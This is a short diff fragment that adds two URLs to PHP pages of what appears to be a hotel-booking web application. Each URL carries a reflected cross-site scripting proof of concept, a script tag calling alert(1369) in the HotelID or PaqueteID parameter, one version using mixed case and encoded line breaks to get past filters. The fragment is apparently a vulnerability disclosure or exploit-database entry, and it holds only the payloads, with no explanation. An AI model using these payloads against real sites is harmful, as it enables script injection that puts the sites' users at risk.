@@ -1,0 +1,2 @@
+http://www.example.com/cadena_paquetes_ext.php?HotelID=pouya_Server&amp;PaqueteID=&lt;ScRiPt%20%0a%0d&gt;alert(1369)%3B&lt;/ScRiPt&gt;
+http://www.example.com/hotel.php?HotelID=&lt;script&gt;alert(1369)&lt;/script&gt;
